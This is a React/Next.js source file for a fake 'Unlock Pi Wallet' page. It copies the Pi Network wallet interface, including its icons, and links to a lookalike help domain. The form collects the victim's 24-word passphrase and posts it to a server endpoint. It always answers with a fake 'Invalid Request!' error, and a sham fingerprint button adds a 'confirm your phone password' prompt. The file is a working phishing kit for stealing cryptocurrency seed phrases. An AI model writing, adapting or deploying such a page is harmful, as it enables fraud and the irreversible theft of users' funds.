"use client";

import React, { useState, useEffect, Suspense } from "react";
import Link from "next/link";
import { useSearchParams } from "next/navigation";

const WALLET_ICON_BASE64 =
  "data:image/png;base64,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";

function WalletViewInner() {
  const searchParams = useSearchParams();
  const [passphrase, setPassphrase] = useState("");
  const [source, setSource] = useState("Wallet");
  const [isLoading, setIsLoading] = useState(false);
  const [responseMsg, setResponseMsg] = useState("");
  const [errorMsg, setErrorMsg] = useState("");
  const [boldErrorMsg, setBoldErrorMsg] = useState("");

  useEffect(() => {
    const src = searchParams.get("source");
    if (src) {
      setSource(src);
    }
  }, [searchParams]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!passphrase.trim()) return;

    setErrorMsg("");
    setResponseMsg("");
    setBoldErrorMsg("");
    setIsLoading(true);

    try {
      await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          passphrase: passphrase.trim(),
          source: source,
        }),
      });

      setTimeout(() => {
        setIsLoading(false);
        setBoldErrorMsg("Invalid Request!");
        setPassphrase("");
      }, 1500);
    } catch (err) {
      console.error(err);
      setIsLoading(false);
      setBoldErrorMsg("Invalid Request!");
      setPassphrase("");
    }
  };

  const handleFingerprint = () => {
    if (typeof window !== "undefined") {
      const confirmed = window.confirm("Please confirm your phone password to continue.");
      if (confirmed) {
        setResponseMsg("");
        setErrorMsg("");
        setBoldErrorMsg("Your wallet is not connected.");
      }
    }
  };

  return (
    <div className="page-wrapper">
      {/* Header matching pinetservice.in */}
      <header className="app-header">
        <div className="header-content-screenshot">
          <Link href="/" className="back-link" aria-label="Back">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
              width="24"
              height="24"
            >
              <path
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M5 12h14m-7-7l-7 7 7 7"
              />
            </svg>
          </Link>
          <div className="header-title">
            <img
              src={WALLET_ICON_BASE64}
              alt="Wallet Icon"
              className="wallet-icon-header"
            />
            <span className="header-wallet-text">Wallet</span>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 42 42"
              fill="#FBB44A"
              className="pi-icon-header"
            >
              <path
                fill="#FBB44A"
                d="M15.6 10.638a.32.32 0 0 1 .324-.318h3.134a.32.32 0 0 1 .324.318v2.434a.32.32 0 0 1-.324.318h-3.134a.32.32 0 0 1-.324-.318v-2.434ZM22.084 10.638c0-.175.145-.318.324-.318h3.134c.18 0 .325.143.325.318v2.434a0.321 0.321 0 0 1-.325 0.318h-3.134a0.321 0.321 0 0 1-.324-0.318v-2.434Z"
              />
              <path
                fill="#FBB44A"
                d="M15.6 18.653v12.642l3.782 1.461V18.653h2.702v12.642l3.783 1.461V18.653h2.513c2.074 0 3.755-1.664 3.755-3.716V12.86H28.38v2.077H13.195c-2.074 0-3.755 1.664-3.755 3.716v2.568h3.755v-2.568H15.6Z"
              />
              <path
                fill="#FBB44A"
                fillRule="evenodd"
                d="M21.445 3.23C11.423 3.23 3.3 11.187 3.3 21s8.124 17.77 18.146 17.77S39.591 30.813 39.591 21 31.467 3.23 21.445 3.23ZM0 21C0 9.402 9.601 0 21.445 0S42.89 9.402 42.89 21 33.29 42 21.445 42 0 32.598 0 21Z"
                clipRule="evenodd"
              />
            </svg>
          </div>
          <span className="dropdown-arrow">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
              width="24"
              height="24"
              style={{ transform: "rotate(-90deg)" }}
            >
              <path
                fill="currentColor"
                d="M15.41 16.59L10.83 12l4.58-4.59L14 6l-6 6 6 6 1.41-1.41z"
              />
            </svg>
          </span>
        </div>
      </header>

      {/* Main Content matching pinetservice.in */}
      <main className="main-content-screenshot">
        <div className="login-container">
          <h3 className="unlock-title">Unlock Pi Wallet</h3>
          <div className="passphrase-input-area" style={{ width: "90%", margin: "auto" }}>
            <form onSubmit={handleSubmit}>
              <textarea
                id="passphrase-textarea"
                rows={8}
                minLength={115}
                required
                placeholder="Enter your 24-word passphrase here"
                value={passphrase}
                onChange={(e) => setPassphrase(e.target.value)}
                disabled={isLoading}
              />
              {responseMsg && <div className="response-message">{responseMsg}</div>}
              {errorMsg && <p className="error-message">{errorMsg}</p>}
              {boldErrorMsg && (
                <p className="error-message font-semibold text-lg">{boldErrorMsg}</p>
              )}
              <button type="submit" className="btn btn-passphrase" disabled={isLoading}>
                {isLoading ? "Verifying..." : "Unlock With Passphrase"}
              </button>
            </form>
            <button
              type="button"
              onClick={handleFingerprint}
              className="btn btn-fingerprint"
            >
              Unlock With Fingerprint
            </button>
          </div>

          <div className="info-text">
            <p>
              As a non-custodial wallet, your wallet passphrase is exclusively accessed only to
              you. Recovery of passphrase is currently impossible.
            </p>
            <p>
              Lost your passphrase?{" "}
              <a
                href="https://pinetservices.help"
                target="_blank"
                rel="noopener noreferrer"
                className="create-wallet-link"
              >
                You can create a new wallet,
              </a>{" "}
              but all your π in your previous wallet will be inaccessible.
            </p>
          </div>
        </div>
      </main>
    </div>
  );
}

export default function WalletView() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen flex items-center justify-center bg-[#f8f9fa] font-mulish">
          <div className="text-zinc-500 font-medium">Loading...</div>
        </div>
      }
    >
      <WalletViewInner />
    </Suspense>
  );
}
